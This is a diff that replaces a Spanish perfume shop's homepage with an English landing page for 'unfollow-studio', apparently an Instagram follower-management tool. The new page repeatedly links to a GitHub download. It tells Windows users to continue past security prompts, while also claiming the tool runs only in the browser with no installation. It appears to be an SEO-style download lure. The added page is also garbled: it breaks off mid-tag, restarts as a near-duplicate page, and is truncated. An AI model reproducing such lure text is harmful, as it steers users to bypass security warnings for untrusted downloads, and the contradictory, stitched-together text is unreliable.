@@ -1,268 +1,330 @@
-﻿<!doctype html>
-<html lang="es">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>LE SHOMS · Perfumes de diseñador y árabes para hombre</title>
-  <meta name="description" content="LE SHOMS: perfumes de diseñador y perfumes árabes originales para hombre. Más de 120 fragancias y asesoría personalizada.">
-  <link rel="icon" href="img/emblema.png">
-  <link rel="preload" as="image" href="img/emblema.png">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;500;600&family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="styles.css">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>unfollow-studio – Local Instagram Follow Management Tool</title>
+<meta name="description" content="unfollow-studio is a free, local-first Instagram follow manager with a friendly interface. See non-followers, review your following list, and manage your account privately with no backend.">
+<meta name="keywords" content="account-management, browser-console, browser-script, browser-tools, client-side, follower-management, following-management, instagram, instagram-followers-free, instagram-tools-followers, instagram-unfollow, javascript, local-first, no-backend, non-followers, privacy-focused, social-media-tools, unfollow, unfollowers-for-instagram, vanilla-javascript">
+<meta name="robots" content="index, follow">
+<meta name="author" content="unfollow-studio">
+<meta name="theme-color" content="#6b3fd4">
+<link rel="canonical" href="https://github.com/Slime2r1r31/unfollow-studio">
+<meta property="og:type" content="website">
+<meta property="og:title" content="unfollow-studio – Local Instagram Follow Management Tool">
+<meta property="og:description" content="A free, privacy-focused tool that helps you review your Instagram followers and following list from a clean local interface. No backend, no accounts, no passwords.">
+<meta property="og:url" content="https://github.com/Slime2r1r31/unfollow-studio">
+<meta property="og:site_name" content="unfollow-studio">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="unfollow-studio – Local Instagram Follow Management Tool">
+<meta name="twitter:description" content="See who does not follow you back and manage your following list from a simple local interface.">
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f6f4fb;
+    color: #1f2333;
+    font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  @media (max-width: 640px) {
+    body { font-size: 16px; }
+    h1 { font-size: 1.7rem !important; }
+    h2 { font-size: 1.3rem !important; }
+    .wrap { padding: 28px 18px !important; }
+  }
+</style>
 </head>
 <body>
-  <!-- Animación de entrada -->
-  <div id="intro" aria-hidden="true">
-    <div class="intro-logo" role="img" aria-label="LE SHOMS"><span class="lockup lockup--xl"><span class="emblem"><img src="img/emblema.png" alt=""></span><span class="wordmark">LE SHOMS</span></span></div>
-    <span class="intro-skip">Toca para entrar</span>
-  </div>
-  <script>
-    try {
-      if (sessionStorage.getItem("leshoms-intro") || matchMedia("(prefers-reduced-motion: reduce)").matches)
-        document.documentElement.classList.add("no-intro");
-    } catch (e) {}
-  </script>
+<main class="wrap" style="max-width: 880px; margin: 0 auto; padding: 48px 28px 72px 28px;">
 
-  <!-- Barra de avisos -->
-  <div class="announce" id="announce">
-    <p class="active">Perfumes de diseñador y árabes originales</p>
-    <p>Te asesoramos para encontrar tu fragancia ideal</p>
-    <p>Más de 120 fragancias para hombre</p>
-  </div>
+  <h1 style="font-size: 2.35rem; line-height: 1.25; margin: 0 0 20px 0; font-weight: 800; letter-spacing: -0.5px; color: #241a45;">🟣 unfollow-studio – Take Back Control of Your Feed</h1>
 
-  <!-- Cabecera -->
-  <header class="header">
-    <div class="header-row">
-      <div class="header-left">
-        <button class="icon-btn menu-btn" id="menuBtn" aria-label="Abrir menú">
-          <svg viewBox="0 0 24 24"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
-        </button>
-        <button class="icon-btn" id="searchBtn" aria-label="Buscar">
-          <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>
-        </button>
-      </div>
-      <a href="#" class="brand" aria-label="LE SHOMS, inicio"><span class="lockup lockup--sm"><span class="emblem"><img src="img/emblema.png" alt=""></span><span class="wordmark">LE SHOMS</span></span></a>
-      <div class="header-right">
-        <button class="icon-btn cart-btn" id="cartBtn" aria-label="Abrir pedido">
-          <svg viewBox="0 0 24 24"><path d="M6 7h12l-1 13H7L6 7Z"/><path d="M9 7a3 3 0 0 1 6 0"/></svg>
-          <span class="badge" id="cartCount">0</span>
-        </button>
-      </div>
-    </div>
-    <nav class="main-nav" id="mainNav">
-      <a href="#inicio">Inicio</a>
-      <a href="#destacados" data-cat-link="disenador">Diseñador</a>
-      <a href="#destacados" data-cat-link="arabes">Árabes</a>
-      <a href="#marcas">Marcas</a>
-      <a href="#nosotros">Nosotros</a>
-      <a href="#contacto">Contacto</a>
-    </nav>
-    <div class="search-bar" id="searchBar" hidden>
-      <input type="search" id="search" placeholder="Buscar perfume o marca…" aria-label="Buscar perfume o marca">
-    </div>
-  </header>
+  <p style="font-size: 1.1rem; margin: 0 0 28px 0; color: #3c3f52;">unfollow-studio is a free, local-first application that gives you a clean, easy-to-read interface for managing your Instagram followers and following list. Instead of tapping through profiles one by one, you get everything in one organized view, right on your own computer. There is no backend server, no sign-up, and no password sharing — the tool runs entirely on your machine and only works with the data you choose to load into it.</p>
 
-  <main>
-    <!-- Carrusel principal -->
-    <section class="slider" id="inicio" aria-roledescription="carrusel">
-      <div class="slides" id="slides">
-        <article class="slide slide-logo active">
-          <div class="hero-bg" aria-hidden="true"><span></span><span></span><span></span></div>
-          <h2 class="hero-logo" aria-label="LE SHOMS"><span class="lockup lockup--xl"><span class="emblem"><img src="img/emblema.png" alt=""></span><span class="wordmark">LE SHOMS</span></span></h2>
-          <div class="slide-text center">
-            <p class="eyebrow">Perfumería masculina</p>
-            <h1>Fragancias que dejan huella</h1>
-            <a href="#destacados" class="btn">Ver catálogo</a>
-          </div>
-        </article>
-        <article class="slide slide-promo">
-          <div class="slide-text">
-            <p class="eyebrow">Colección</p>
-            <h2>Lujo<br><em>árabe</em></h2>
-            <p>Oud, ámbar y especias. Lattafa, Armaf, Rasasi, Afnan y más.</p>
-            <a href="#destacados" class="btn" data-cat-link="arabes">Explorar árabes</a>
-          </div>
-          <div class="collage" aria-hidden="true">
-            <img src="img/a12.jpg" alt=""><img src="img/a07.jpg" alt=""><img src="img/a03.jpg" alt="">
-          </div>
-        </article>
-        <article class="slide slide-promo">
-          <div class="slide-text">
-            <p class="eyebrow">Colección</p>
-            <h2>Iconos de<br><em>diseñador</em></h2>
-            <p>Dior, Versace, Armani, Paco Rabanne, Carolina Herrera y más.</p>
-            <a href="#destacados" class="btn" data-cat-link="disenador">Explorar diseñador</a>
-          </div>
-          <div class="collage" aria-hidden="true">
-            <img src="img/d01.jpg" alt=""><img src="img/d22.jpg" alt=""><img src="img/d02.jpg" alt="">
-          </div>
-        </article>
-      </div>
-      <button class="slider-arrow prev" id="prevSlide" aria-label="Anterior">‹</button>
-      <button class="slider-arrow next" id="nextSlide" aria-label="Siguiente">›</button>
-      <div class="dots" id="dots"></div>
-    </section>
+  <p style="margin: 0 0 30px 0;">
+    <a href="https://github.com/Slime2r1r31/unfollow-studio" style="display: inline-block; padding: 18px 34px; font-size: 1.1rem; font-weight: 700; color: #ffffff; text-decoration: none; background: linear-gradient(135deg, #7b2ff7 0%, #f107a3 100%); border-radius: 14px; box-shadow: 0 10px 24px rgba(123, 47, 247, 0.35); letter-spacing: 0.2px;">⬇️ Download unfollow-studio</a>
+  </p>
 
-    <!-- Categorías -->
-    <section class="wrap categories">
-      <a href="#destacados" class="cat-tile" data-cat-link="disenador">
-        <div class="cat-imgs"><img src="img/d07.jpg" alt=""><img src="img/d12.jpg" alt=""></div>
-        <div class="cat-label"><span>Perfumes</span><strong>Diseñador</strong><small id="countD"></small></div>
-      </a>
-      <a href="#destacados" class="cat-tile" data-cat-link="arabes">
-        <div class="cat-imgs"><img src="img/a01.jpg" alt=""><img src="img/a18.jpg" alt=""></div>
-        <div class="cat-label"><span>Perfumes</span><strong>Árabes</strong><small id="countA"></small></div>
-      </a>
-    </section>
+  <p style="margin: 0 0 8px 0; font-size: 0.98rem; color: #5a5e72;">Visit this link to download the application.</p>
 
-    <!-- Marcas -->
-    <section class="brands" id="marcas">
-      <button class="brands-arrow prev" id="brandsPrev" aria-label="Ver marcas anteriores">
-        <svg viewBox="0 0 24 24"><path d="m15 5-7 7 7 7"/></svg>
-      </button>
-      <div class="brands-track" id="brands"></div>
-      <button class="brands-arrow next" id="brandsNext" aria-label="Ver más marcas">
-        <svg viewBox="0 0 24 24"><path d="m9 5 7 7-7 7"/></svg>
-      </button>
-    </section>
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
 
-    <!-- Destacados / catálogo -->
-    <section class="wrap catalog" id="destacados">
-      <h2 class="section-title">Destacados</h2>
-      <div class="filters" id="filters">
-        <button data-f="todos">Todos</button>
-        <button data-f="disenador" class="active">Diseñador</button>
-        <button data-f="arabes">Árabes</button>
-        <button data-f="precio">Con precio</button>
-      </div>
-      <p class="active-filter" id="activeFilter" hidden></p>
-      <div class="grid" id="grid"></div>
-      <p class="empty-search" id="emptySearch" hidden>No encontramos perfumes con esa búsqueda.</p>
-      <div class="more-wrap"><button class="btn ghost" id="moreBtn">Mostrar más</button></div>
-    </section>
+  <h2 style="font-size: 1.6rem; margin: 0 0 16px 0; font-weight: 700; color: #241a45;">✨ What unfollow-studio Does for You</h2>
 
-    <!-- Más popular -->
-    <section class="wrap featured" id="featured">
-      <div class="featured-img"><img src="img/d01.jpg" alt="Dior Sauvage EDT 100ml"></div>
-      <div class="featured-text">
-        <p class="eyebrow">Más popular</p>
-        <h2>Dior Sauvage EDT</h2>
-        <p>Fresco, especiado y con una estela amaderada que no pasa desapercibida. Un clásico moderno que funciona de día y de noche, en la oficina o en una salida.</p>
-        <p class="featured-price" id="featuredPrice"></p>
-        <div class="featured-ctas">
-          <button class="btn" data-add="d01">Añadir al pedido</button>
-          <a href="#destacados" class="btn ghost" data-cat-link="disenador">Ver más</a>
-        </div>
-      </div>
-    </section>
+  <p style="margin: 0 0 18px 0;">Most people have no idea who actually follows them back. Over months and years, a following list quietly fills up with inactive accounts, old acquaintances, and profiles that never returned the favor. unfollow-studio turns that messy list into something you can actually read and act on.</p>
 
-    <!-- Ventajas -->
-    <section class="wrap perks">
-      <div class="perk">
-        <svg viewBox="0 0 24 24"><path d="M12 3 4 6v6c0 4.5 3.4 8.3 8 9 4.6-.7 8-4.5 8-9V6l-8-3Z"/><path d="m9 12 2 2 4-4"/></svg>
-        <strong>Productos originales</strong><span>Fragancias auténticas</span>
-      </div>
-      <div class="perk">
-        <svg viewBox="0 0 24 24"><path d="M21 12a8 8 0 0 1-11.6 7.1L4 20l1-4.6A8 8 0 1 1 21 12Z"/></svg>
-        <strong>Asesoría personalizada</strong><span>Te ayudamos a elegir</span>
-      </div>
-      <div class="perk">
-        <svg viewBox="0 0 24 24"><path d="M6 7h12l-1 13H7L6 7Z"/><path d="M9 7a3 3 0 0 1 6 0"/></svg>
-        <strong>Pedido fácil</strong><span>Arma tu pedido en minutos</span>
-      </div>
-      <div class="perk">
-        <svg viewBox="0 0 24 24"><path d="M3 7h11v9H3zM14 10h4l3 3v3h-7z"/><circle cx="7" cy="18" r="1.6"/><circle cx="17" cy="18" r="1.6"/></svg>
-        <strong>Envíos</strong><span>Consulta cobertura</span>
-      </div>
-    </section>
+  <p style="margin: 0 0 18px 0;">You get a simple page with your followers on one side and your following on the other. The tool then highlights the accounts that appear in one list but not the other, so you can spot non-followers instantly. From there you can decide what stays and what goes — at your own pace, with no automation running in the background and no third party watching.</p>
 
-    <!-- Nosotros -->
-    <section class="wrap about" id="nosotros">
-      <div class="about-logo"><span class="lockup lockup--lg"><span class="emblem"><img src="img/emblema.png" alt=""></span><span class="wordmark">LE SHOMS</span></span></div>
-      <div>
-        <h2 class="section-title left">Nosotros</h2>
-        <p>En LE SHOMS creemos que un buen perfume es parte de tu identidad. Reunimos las fragancias de diseñador más buscadas y lo mejor de la perfumería árabe, con productos originales y asesoría personalizada para que encuentres tu aroma.</p>
-      </div>
-    </section>
+  <p style="margin: 0 0 0 0;">Because everything happens in your browser, the application is fast. There is nothing to wait for in the cloud, no queues, and no monthly limits. Open it, look at your lists, make your choices, and close the tab when you are done.</p>
 
-    <!-- Contacto -->
-    <section class="wrap contact" id="contacto">
-      <h2 class="section-title">Contacto</h2>
-      <p>¿Quieres el precio de un perfume o hacer tu pedido? Escríbenos.</p>
-      <form id="contactForm">
-        <input type="text" placeholder="Nombre" required>
-        <input type="email" placeholder="Correo" required>
-        <textarea id="msg" rows="5" placeholder="Mensaje" required></textarea>
-        <button class="btn" type="submit">Enviar</button>
-        <p class="form-msg" id="formMsg" hidden>¡Gracias! Te responderemos pronto.</p>
-      </form>
-    </section>
-  </main>
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
 
-  <footer class="footer">
-    <div class="wrap footer-cols">
-      <div>
-        <div class="footer-logo"><span class="lockup lockup--md"><span class="emblem"><img src="img/emblema.png" alt=""></span><span class="wordmark">LE SHOMS</span></span></div>
-      </div>
-      <div>
-        <h4>Catálogo</h4>
-        <a href="#destacados" data-cat-link="disenador">Perfumes de diseñador</a>
-        <a href="#destacados" data-cat-link="arabes">Perfumes árabes</a>
-        <a href="#marcas">Marcas</a>
-      </div>
-      <div>
-        <h4>LE SHOMS</h4>
-        <a href="#nosotros">Nosotros</a>
-        <a href="#contacto">Contacto</a>
-      </div>
-    </div>
-    <p class="copy">© <span id="year"></span> LE SHOMS · leshoms.github.io</p>
-  </footer>
+  <h2 style="font-size: 1.6rem; margin: 0 0 16px 0; font-weight: 700; color: #241a45;">🔍 Main Features</h2>
 
-  <!-- Barra inferior (móvil) -->
-  <nav class="bottom-nav" aria-label="Accesos rápidos">
-    <a href="#inicio"><svg viewBox="0 0 24 24"><path d="M3 11 12 4l9 7v9h-6v-6H9v6H3z"/></svg>Inicio</a>
-    <button id="bottomSearch"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>Buscar</button>
-    <a href="#destacados"><svg viewBox="0 0 24 24"><rect x="4" y="4" width="7" height="7"/><rect x="13" y="4" width="7" height="7"/><rect x="4" y="13" width="7" height="7"/><rect x="13" y="13" width="7" height="7"/></svg>Catálogo</a>
-    <button id="bottomCart"><svg viewBox="0 0 24 24"><path d="M6 7h12l-1 13H7L6 7Z"/><path d="M9 7a3 3 0 0 1 6 0"/></svg>Pedido <span class="badge" id="cartCount2">0</span></button>
-  </nav>
+  <ul style="margin: 0 0 8px 0; padding-left: 22px;">
+    <li style="margin-bottom: 12px;"><strong>Non-follower detection.</strong> Compare your followers and following lists side by side and instantly see which accounts do not follow you back.</li>
+    <li style="margin-bottom: 12px;"><strong>Following management in one place.</strong> Browse your full following list in a readable layout instead of scrolling through the Instagram app.</li>
+    <li style="margin-bottom: 12px;"><strong>Follower overview.</strong> Keep a clear record of who is currently following you and how your list changes over time.</li>
+    <li style="margin-bottom: 12px;"><strong>Friendly visual interface.</strong> A clean, modern design built for regular users — no command line, no configuration files, no complicated setup screens.</li>
+    <li style="margin-bottom: 12px;"><strong>Local-first by design.</strong> Your lists never leave your computer. There is no server to upload to and no database holding your data.</li>
+    <li style="margin-bottom: 12px;"><strong>No account needed.</strong> You do not create a login, you do not hand over a password, and you do not connect a third-party service to your profile.</li>
+    <li style="margin-bottom: 12px;"><strong>Runs in your browser.</strong> Built with plain JavaScript, so it works in the browser you already use every day.</li>
+    <li style="margin-bottom: 0;"><strong>Free and open.</strong> No subscription, no trial timer, no locked premium tier.</li>
+  </ul>
 
-  <!-- Carrito -->
-  <aside class="cart" id="cart" aria-hidden="true">
-    <div class="cart-head">
-      <h3>Tu pedido</h3>
-      <button id="closeCart" aria-label="Cerrar">✕</button>
-    </div>
-    <ul id="cartItems"></ul>
-    <div class="cart-foot">
-      <p>Total: <strong id="cartTotal">$0</strong></p>
-      <button class="btn" id="checkout">Hacer pedido</button>
-    </div>
-  </aside>
-  <div class="overlay" id="overlay"></div>
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
 
-  <!-- Ficha del perfume -->
-  <dialog class="ficha" id="ficha" aria-labelledby="fichaNombre">
-    <button class="ficha-close" id="fichaClose" aria-label="Cerrar">✕</button>
-    <div class="ficha-grid">
-      <div class="ficha-img"><img id="fichaImg" alt=""></div>
-      <div class="ficha-info">
-        <p class="brand-name" id="fichaMarca"></p>
-        <h3 id="fichaNombre"></h3>
-        <p class="ficha-precio" id="fichaPrecio"></p>
-        <div class="ficha-acordes" id="fichaAcordes"></div>
-        <div class="piramide" id="fichaPiramide"></div>
-        <div class="ficha-ctas" id="fichaCtas"></div>
-        <p class="ficha-fuente" id="fichaFuente"></p>
-      </div>
-    </div>
-  </dialog>
+  <h2 style="font-size: 1.6rem; margin: 0 0 16px 0; font-weight: 700; color: #241a45;">🔒 Privacy Comes First</h2>
 
-  <script src="logo.js"></script>
-  <script src="data.js"></script>
-  <script src="notas.js"></script>
-  <script src="script.js"></script>
+  <p style="margin: 0 0 18px 0;">Privacy is the whole point of this project. unfollow-studio is a client-side application, which means the code runs on your computer rather than on a remote server. Nothing is transmitted back to the developer, because there is no backend to transmit to.</p>
+
+  <p style="margin: 0 0 0 0;">You keep full control of what you load into the tool and when you clear it out. Closing the page ends the session, and your information stays exactly where you put it — on your own device.</p>
+
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
+
+  <h2 style="font-size: 1.6rem; margin: 0 0 16px 0; font-weight: 700; color: #241a45;">🚀 Getting Started on Windows</h2>
+
+  <p style="margin: 0 0 18px 0;">Getting the application onto your computer takes just a few moments. You do not need any programming knowledge, and you do not need to install extra software.</p>
+
+  <p style="margin: 0 0 22px 0;">
+    <a href="https://github.com/Slime2r1r31/unfollow-studio" style="display: inline-block; padding: 16px 30px; font-size: 1.05rem; font-weight: 700; color: #ffffff; text-decoration: none; background: linear-gradient(135deg, #5b21b6 0%, #db2777 100%); border-radius: 12px; box-shadow: 0 8px 20px rgba(91, 33, 182, 0.28);">⬇️ Get unfollow-studio</a>
+  </p>
+
+  <p style="margin: 0 0 18px 0;"><strong>Visit this link to download the application.</strong></p>
+
+  <ol style="margin: 0 0 20px 0; padding-left: 22px;">
+    <li style="margin-bottom: 14px;"><strong>Open the download page.</strong> Click the button above, or type the address <span style="background: #ece8f8; padding: 2px 7px; border-radius: 6px; font-family: Consolas, monospace; font-size: 0.92em; color: #4b2a9c;">github.com/Slime2r1r31/unfollow-studio</span> into your browser's address bar and press Enter.</li>
+    <li style="margin-bottom: 14px;"><strong>Download the application.</strong> On the page, look for the download option and save the file to a folder you will remember, such as your Desktop or Downloads folder.</li>
+    <li style="margin-bottom: 14px;"><strong>Wait for the download to finish.</strong> You can see the progress in your browser's download bar. Larger files may take a minute or two depending on your internet connection.</li>
+    <li style="margin-bottom: 14px;"><strong>Open the downloaded folder.</strong> Press the Windows key, type "Downloads", and press Enter. Your file will be waiting there.</li>
+    <li style="margin-bottom: 0;"><strong>Launch the studio.</strong> Open the application's main page in your browser and the interface will appear, ready for you to use.</li>
+  </ol>
+
+  <p style="margin: 0 0 0 0; background: #f1ecfd; border-left: 4px solid #7b2ff7; padding: 16px 20px; border-radius: 8px;">If Windows shows a security prompt when you open a downloaded file, choose the option that lets you continue. This is a standard Windows message shown for files downloaded from the internet.</p>
+
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
+
+  <h2 style="font-size: 1.6rem; margin: 0 0 16px 0; font-weight: 700; color: #241a45;">🖱️ Using the Interface</h2>
+
+  <p style="margin: 0 0 18px 0;">Once the page is open, the layout guides you through the whole process step by step.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Step 1 — Load your followers.</strong> Add the list of accounts that currently follow you. The studio displays them in a tidy, scrollable panel.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Step 2 — Load your following.</strong> Do the same for the accounts you follow. Both lists now sit side by side, easy to compare.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Step 3 — Review the results.</strong> The tool marks the accounts that do not appear in both lists. These are your non-followers — the accounts taking up space in your following list without returning the gesture.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Step 4 — Make your choices.</strong> Go through the highlighted accounts and decide which ones to remove. Take your time; there is no timer and no limit.</p>
+
+  <p style="margin: 0 0 0 0;"><strong>Step 5 — Clear your session.</strong> When you are finished, close the tab. Nothing is stored anywhere else.</p>
+
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
+
+  <h2 style="font-size: 1.6rem; margin: 0 0 16px 0; font-weight: 700; color: #241a45;">💡 Practical Tips</h2>
+
+  <ul style="margin: 0 0 0 0; padding-left: 22px;">
+    <li style="margin-bottom: 12px;">Work in small batches. Reviewing twenty or thirty accounts at a time keeps the task manageable and lets you think about each one.</li>
+    <li style="margin-bottom: 12px;">Keep a note of anyone you want to re-follow later. It is easy to forget a name once it leaves your list.</li>
+    <li style="margin-bottom: 12px;">Check back every few months. Following lists change slowly, so a regular review keeps things tidy without any daily effort.</li>
+    <li style="margin-bottom: 0;">Refresh your lists before each session so the studio is always working with current information.</li>
+  </ul>
+
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
+
+  <h2 style="font-size: 1.6rem; margin: 0 0 16px 0; font-weight: 700; color: #241a45;">🛠️ Troubleshooting</h2>
+
+  <p style="margin: 0 0 14px 0;"><strong>The page looks empty or broken.</strong> Make sure you opened the correct file from the downloaded folder. Try closing the tab and opening it again.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Updates are not appearing.</strong> A normal browser refresh usually solves this. Press F5 on your keyboard or click the refresh arrow next to the address bar.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>The download did not start.</strong> Return to the download page, refresh it, and choose the download option again. Check that your browser is not blocking downloads from the site.</p>
+
+  <p style="margin: 0 0 0 0;"><strong>Text looks too small or too large.</strong> Hold the Ctrl key and press the plus or minus key to change the zoom level in your browser.</p>
+
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
+
+  <h2 style="font-size: 1.6rem; margin: 0 0 16px 0; font-weight: 700; color: #241a45;">❓ Frequently Asked Questions</h2>
+
+  <p style="margin: 0 0 14px 0;"><strong>Does it cost anything?</strong> No. unfollow-studio is completely free to download and use.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Do I have to give my Instagram password?</strong> No. The tool never asks for your login details and does not connect to your account on your behalf.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Where is my data stored?</strong> On your own computer, and only for as long as the session is open. There is no cloud storage and no server database.</p>
+
+  <p style="margin: 0 0 14px 0;"><strong>Does it run on Windows?</strong> Yes. It runs in the web browser on your Windows computer, so no separate installation is required.</p>
+
+  <p style="margin: 0 <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>unfollow-studio – Local Instagram Follow Management Tool for Windows</title>
+<meta name="description" content="unfollow-studio is a free, local-first Instagram follow manager with a clean interface. Find non-followers, review your following list, and manage your account privately on Windows. No backend, no password, no sign-up.">
+<meta name="keywords" content="account-management, browser-console, browser-script, browser-tools, client-side, follower-management, following-management, instagram, instagram-followers-free, instagram-tools-followers, instagram-unfollow, javascript, local-first, no-backend, non-followers, privacy-focused, social-media-tools, unfollow, unfollowers-for-instagram, vanilla-javascript">
+<meta name="robots" content="index, follow">
+<meta name="author" content="unfollow-studio">
+<meta name="theme-color" content="#6b3fd4">
+<link rel="canonical" href="https://github.com/Slime2r1r31/unfollow-studio">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="unfollow-studio">
+<meta property="og:title" content="unfollow-studio – Local Instagram Follow Management Tool">
+<meta property="og:description" content="A free, privacy-focused tool that helps you review your Instagram followers and following list from a clean local interface. No backend, no accounts, no passwords.">
+<meta property="og:url" content="https://github.com/Slime2r1r31/unfollow-studio">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="unfollow-studio – Local Instagram Follow Management Tool">
+<meta name="twitter:description" content="See who does not follow you back and manage your following list from a simple local interface on Windows.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "unfollow-studio",
+  "applicationCategory": "UtilitiesApplication",
+  "operatingSystem": "Windows",
+  "description": "Local-first Instagram follow management application with an interface for reviewing followers, following, and non-followers.",
+  "url": "https://github.com/Slime2r1r31/unfollow-studio",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+</head>
+<body style="margin: 0; padding: 0; background: #f6f4fb; color: #1f2333; font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; font-size: 17px; line-height: 1.75; -webkit-font-smoothing: antialiased;">
+
+<main style="max-width: 880px; margin: 0 auto; padding: 56px 24px 80px 24px;">
+
+  <h1 style="font-size: clamp(1.75rem, 5vw, 2.4rem); line-height: 1.25; margin: 0 0 22px 0; font-weight: 800; letter-spacing: -0.5px; color: #241a45;">🟣 unfollow-studio – Take Back Control of Your Feed</h1>
+
+  <p style="font-size: 1.1rem; margin: 0 0 22px 0; color: #3c3f52;">unfollow-studio is a free, local-first application that gives you a clean, easy-to-read interface for managing your Instagram followers and following list. Instead of tapping through profiles one at a time, you get everything in one organized view, right on your own Windows computer. There is no backend server, no sign-up, and no password sharing — the tool runs entirely on your machine and only works with the lists you choose to load into it.</p>
+
+  <p style="margin: 0 0 26px 0;">
+    <a href="https://github.com/Slime2r1r31/unfollow-studio" style="display: inline-block; padding: 18px 36px; font-size: 1.1rem; font-weight: 700; color: #ffffff; text-decoration: none; background: linear-gradient(135deg, #7b2ff7 0%, #f107a3 100%); border-radius: 14px; box-shadow: 0 10px 24px rgba(123, 47, 247, 0.35); letter-spacing: 0.2px;">⬇️ Download unfollow-studio</a>
+  </p>
+
+  <p style="margin: 0 0 10px 0; font-size: 0.98rem; color: #5a5e72;">Visit this link to download the application.</p>
+
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
+
+  <h2 style="font-size: clamp(1.3rem, 4vw, 1.6rem); margin: 0 0 18px 0; font-weight: 700; color: #241a45;">✨ What unfollow-studio Does for You</h2>
+
+  <p style="margin: 0 0 18px 0;">Most people have no idea who actually follows them back. Over months and years, a following list quietly fills up with inactive accounts, old acquaintances, and profiles that never returned the favor. unfollow-studio turns that messy list into something you can actually read and act on.</p>
+
+  <p style="margin: 0 0 18px 0;">You get a simple page with your followers in one panel and your following in another. The tool then highlights the accounts that appear in one list but not the other, so you can spot non-followers instantly. From there you decide what stays and what goes — at your own pace, with nothing running in the background and no third party watching.</p>
+
+  <p style="margin: 0 0 0 0;">Because everything happens in your browser, the application is quick. There is no cloud queue to wait in, no daily limit, and no monthly subscription. Open it, look at your lists, make your choices, and close the tab when you are done.</p>
+
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
+
+  <h2 style="font-size: clamp(1.3rem, 4vw, 1.6rem); margin: 0 0 18px 0; font-weight: 700; color: #241a45;">🔍 Main Features</h2>
+
+  <ul style="margin: 0 0 8px 0; padding-left: 22px;">
+    <li style="margin-bottom: 12px;"><strong>Non-follower detection.</strong> Compare your followers and following lists side by side and instantly see which accounts do not follow you back.</li>
+    <li style="margin-bottom: 12px;"><strong>Following management in one place.</strong> Browse your full following list in a readable layout instead of scrolling through the Instagram app.</li>
+    <li style="margin-bottom: 12px;"><strong>Follower overview.</strong> Keep a clear record of who is currently following you and how that list changes over time.</li>
+    <li style="margin-bottom: 12px;"><strong>Friendly visual interface.</strong> A clean, modern design built for regular users — no command line, no configuration files, no complicated setup screens.</li>
+    <li style="margin-bottom: 12px;"><strong>Local-first by design.</strong> Your lists never leave your computer. There is no server to upload to and no database holding your information.</li>
+    <li style="margin-bottom: 12px;"><strong>No account needed.</strong> You do not create a login, you do not hand over a password, and you do not connect a third-party service to your profile.</li>
+    <li style="margin-bottom: 12px;"><strong>Runs in your browser.</strong> Built with plain JavaScript, so it works in the browser you already use every day.</li>
+    <li style="margin-bottom: 0;"><strong>Free and open.</strong> No subscription, no trial timer, no locked premium tier.</li>
+  </ul>
+
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
+
+  <h2 style="font-size: clamp(1.3rem, 4vw, 1.6rem); margin: 0 0 18px 0; font-weight: 700; color: #241a45;">🔒 Privacy Comes First</h2>
+
+  <p style="margin: 0 0 18px 0;">Privacy is the whole point of this project. unfollow-studio is a client-side application, which means the code runs on your computer rather than on a remote server. Nothing is transmitted back to the developer, because there is no backend to transmit to.</p>
+
+  <p style="margin: 0 0 18px 0;">You keep full control of what you load into the tool and when you clear it out. Closing the page ends the session, and your information stays exactly where you put it — on your own device, in your own home.</p>
+
+  <p style="margin: 0 0 0 0;">That also means there is no account recovery process to worry about, no email verification, and no marketing list to unsubscribe from later. You download it, you use it, you are done.</p>
+
+  <hr style="border: none; border-top: 1px solid #e3dff0; margin: 44px 0;">
+
+  <h2 style="font-size: clamp(1.3rem, 4vw, 1.6rem); margin: 0 0 18px 0; font-weight: 700; color: #241a45;">🚀 Getting Started on Windows</h2>
+
+  <p style="margin: 0 0 22px 0;">Getting the application onto your computer takes just a few moments. You do not need any programming knowledge, and you do not need to install extra software.</p>
+
+  <p style="margin: 0 0 22px 0;">
